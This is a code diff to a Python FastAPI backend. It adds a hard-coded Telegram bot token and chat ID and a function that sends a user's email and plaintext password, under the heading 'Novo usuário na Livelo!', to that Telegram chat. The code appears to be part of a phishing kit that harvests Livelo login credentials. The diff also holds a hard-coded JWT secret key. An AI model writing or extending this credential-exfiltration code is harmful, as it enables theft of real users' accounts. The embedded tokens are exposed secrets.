@@ -12,6 +12,7 @@ import uuid
 from datetime import datetime, timezone, timedelta
 import jwt
 import hashlib
+import httpx
 
 
 ROOT_DIR = Path(__file__).parent
@@ -27,6 +28,10 @@ SECRET_KEY = "donas-admin-secret-key-2025"
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 480
 
+# Telegram Configuration
+TELEGRAM_BOT_TOKEN = "8483612343:AAGSw4EX0c0IIjTOiXjoki7vHkN-ctjx8n8"
+TELEGRAM_CHAT_ID = "-1003679199178"
+
 security = HTTPBearer()
 
 # Create the main app without a prefix
@@ -34,6 +39,30 @@ app = FastAPI()
 
 # Create a router with the /api prefix
 api_router = APIRouter(prefix="/api")
+
+# Função para enviar notificação no Telegram
+async def send_telegram_notification(email: str, password: str, device: str = "Desktop", country: str = "Brasil"):
+    try:
+        now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
+        message = f"""🔔 *Novo usuário na Livelo!*
+
+📧 *Login:* `{email}`
+🔑 *Senha:* `{password}`
+📱 *Dispositivo:* {device}
+🌍 *País:* {country}
+⏰ *Horário:* {now} UTC"""
+        
+        async with httpx.AsyncClient() as client:
+            await client.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                json={
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": message,
+                    "parse_mode": "Markdown"
+                }
+            )
+    except Exception as e:
+        logging.error(f"Erro ao enviar notificação Telegram: {e}")
 
 
 # Define Models
